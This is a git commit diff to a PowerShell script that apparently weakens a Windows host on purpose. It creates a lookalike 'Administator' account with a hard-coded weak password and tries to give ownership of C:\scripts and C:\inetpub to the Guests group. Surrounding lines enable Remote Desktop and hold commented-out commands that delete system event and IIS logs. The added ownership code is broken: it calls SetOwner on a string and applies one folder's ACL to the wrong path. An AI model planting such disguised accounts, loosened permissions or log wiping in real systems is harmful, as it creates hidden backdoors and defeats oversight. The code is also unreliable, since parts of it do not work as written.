be0dea2662b45318079deb3477a693f0d9d10edc
Pragun Bajracharya <pragunbaj99@gmail.com>
2023-04-06 14:39:40 -0400

    Added directory ownership transfer code

--- phase2.ps1
+++ phase2.ps1
@@ -3,8 +3,26 @@
 #removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
 #removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"
 
-New-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString "p@ssword123" -AsPlainText -Force) -FullName "Administrator" -Description ""
-Add-LocalGroupMember -Group "Guests" -Member "Administrator"
+New-LocalUser -Name "Administator" -Password (ConvertTo-SecureString "p@ssword123" -AsPlainText -Force) -FullName "Administrator" -Description ""
+Add-LocalGroupMember -Group "Guests" -Member "Administator"
+
+# Get the current folder ACL
+$scriptsFolder = Get-Acl "C:\scripts"
+$inetpubFolder = Get-Acl "C:\inetpub"
+
+# Get the current owner of the folder
+$scriptsFolderOwner = $scriptsFolder.Owner
+$inetpubFolderOwner = $inetpubFolder.Owner
+
+# Set the new owner of the folder
+$newOwner = New-Object System.Security.Principal.NTAccount("domain\Guests")
+$scriptsFolderOwner.SetOwner($newOwner)
+$inetpubFolderOwner.SetOwner($newOwner)
+
+# Set the new ACL for the folder
+Set-Acl "C:\scripts" $scriptsFolder
+Set-Acl "C:\scripts" $inetpubFolder
+
 
 # Enable Remote Desktop Connection
 Set-ItemProperty ‘HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\‘ -Name “fDenyTSConnections” -Value 0
